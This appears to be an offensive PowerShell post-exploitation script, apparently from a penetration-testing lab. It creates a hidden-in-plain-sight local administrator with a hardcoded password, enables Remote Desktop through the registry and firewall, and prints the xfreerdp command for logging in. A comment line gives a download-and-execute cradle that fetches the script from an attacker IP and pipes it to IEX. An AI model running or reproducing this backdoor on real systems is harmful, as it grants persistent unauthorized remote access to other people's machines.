#Requires -RunAsAdministrator
# (New-Object System.Net.WebClient).DownloadString('http://192.168.45.160/Create-Admin.ps1') | IEX
function Test-Administrator  
{  
    $user = [Security.Principal.WindowsIdentity]::GetCurrent();
    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)  
}

function Create-Admin{
    # Create an Administrator user on the box and enable RDP (Requires Admin Privs)
    [CmdletBinding()]
    param (
    $username="amit",
    $password="Password123!"
    )
    if( !(Test-Administrator) ){
        Write-Output "This must be ran as an Administrator."
        Return
    }
    
    # Create new local administrator
    net user $username $password /add &&  net localgroup administrators $username /add && net localgroup "Remote Desktop Users" $username /add

    # Enable RDP if it's currently disabled
    $RDP = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections"
    if ($RDP.fDenyTSConnections -eq 1) {
        Write-Output "Enabling Remote Desktop..."
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
        netsh advfirewall firewall set rule group='remote desktop' new enable=Yes
        Write-Output "Remote Desktop is now enabled."
    } else {
        Write-Output "Remote Desktop is already enabled."
    }
    
    Write-Host "xfreerdp +clipboard /dynamic-resolution /u:"+$username+" /p:'"+$password+"' /tls-seclevel:0 /v:<tgt_ip>"
}
Create-Admin
